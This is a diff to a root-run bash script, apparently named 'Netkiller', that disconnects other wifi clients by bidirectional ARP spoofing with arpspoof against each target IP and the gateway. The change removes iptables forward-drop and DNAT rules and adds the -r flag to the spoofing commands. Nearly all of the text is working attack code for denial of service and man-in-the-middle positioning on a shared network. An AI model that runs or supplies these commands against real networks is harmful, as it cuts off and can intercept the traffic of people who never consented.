@@ -12,7 +12,7 @@ if [[ $EUID -ne 0 ]]; then
 fi
 
 # Check for required tools
-REQUIRED_TOOLS=("dsniff" "iptables" "ipcalc")
+REQUIRED_TOOLS=("dsniff" "ipcalc")
 
 for tool in "${REQUIRED_TOOLS[@]}"; do
     if ! command -v "$tool" &> /dev/null; then
@@ -75,12 +75,10 @@ cat > /bin/netkiller-stop << EOF
 #!/bin/sh
 
 sudo ip -s -s neigh flush all >/dev/null
-sudo iptables -t nat -F
-sudo iptables -F FORWARD
 sudo pkill -f arpspoof
 echo "Netkiller is stopped!"
 sleep 2s
-echo "Restoring the client connections..."
+echo "Restoring the Client Connection..."
 EOF
 sudo chmod 755 /bin/netkiller-stop
 
@@ -140,16 +138,10 @@ for TARGET in $TARGET_IPS; do
         echo "Skipping $TARGET (matches gateway or device IP)."
         continue
     fi
-        # Block all traffic of the target wifi clients
-        sudo iptables -P FORWARD DROP
-        sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -A FORWARD -s "$TARGET" -j DROP
-        sudo iptables -A FORWARD -d "$TARGET" -j DROP
      (
         # Bidirectional ARP Spoofing
-       sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-       sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
+       sudo arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
+       sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
      ) &
        echo "Netkiller killing the target IP: $TARGET"
 done
